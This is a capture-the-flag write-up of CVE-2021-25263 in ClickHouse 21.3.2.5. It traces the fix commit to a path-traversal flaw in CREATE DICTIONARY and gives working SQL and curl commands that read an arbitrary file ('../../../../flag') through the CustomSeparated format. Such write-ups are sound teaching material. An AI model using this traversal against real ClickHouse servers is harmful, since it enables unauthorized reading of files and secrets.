# ReaCH me

## Vulnerability
CVE-2021-25263

## Exploitation
The challenge is limited to a single docker image of ClickHouse 21.3.2.5, with a flag in the root folder.
Looking at [ClickHouse security changelog](https://clickhouse.com/docs/en/whats-new/security-changelog), we find that our version is vulnerable to:
> CVE-2021-25263
> An attacker that has CREATE DICTIONARY privilege, can read arbitary file outside permitted directory.

An [exploit](https://250.ac.cn/2021/10/18/CVE-2021-25263) can be found online.

If not found, looking in ClickHouse repository, we find two issues talking about the CVE:
https://github.com/ClickHouse/ClickHouse/issues/26823
https://github.com/ClickHouse/ClickHouse/issues/28056

They both link to the commit that fixed the issue ([link](https://github.com/ClickHouse/ClickHouse/pull/22822)).

Before, when creating a dictionary, ClickHouse took the user input and ensured it starts with the user_files_path setting (by default: `/var/lib/clickhouse/user_files/`).
After the fix, the user input is transformed into an absolute path.

This fix hints that ClickHouse is subject to Local File Inclusion, using a user input like `/var/lib/clickhouse/user_files/../../../../etc/passwd`.

ClickHouse documentation explains how to [create a dictionary](https://clickhouse.com/docs/en/sql-reference/statements/create/dictionary#syntax), over a [local file](https://clickhouse.com/docs/en/sql-reference/dictionaries#local_file).

The main difficulty here is to find a suitable file format.
After trial and error, one format allow reading any kind of file on disk is `CustomSeparated`, specifying a separator.

In our case, that leads to:
```sql
CREATE DICTIONARY flag (
    id UInt64,
    incomplete_flag String DEFAULT ''
)
PRIMARY KEY id
SOURCE(FILE(PATH '/var/lib/clickhouse/user_files/../../../../flag' FORMAT 'CustomSeparated'))
LIFETIME(MIN 0 MAX 1000)
LAYOUT(FLAT())
SETTINGS(format_custom_field_delimiter = 'f', format_custom_row_after_delimiter = '')
```

We can then read the content of the dictionary using `SELECT * from flag`.

The following two commands summarises the exploit:
```bash
echo "CREATE DICTIONARY flag (id UInt64, incomplete_flag String DEFAULT '') PRIMARY KEY id SOURCE(FILE(PATH '/var/lib/clickhouse/user_files/../../../../flag' FORMAT 'CustomSeparated')) LIFETIME(MIN 0 MAX 1000) LAYOUT(FLAT()) SETTINGS(format_custom_field_delimiter = 'f', format_custom_row_after_delimiter = '')" | curl 'http://localhost:8123/' --data-binary @-
echo "SELECT * FROM flag" | curl 'http://localhost:8123/' --data-binary @-
```

## Fix
Upgrade ClickHouse
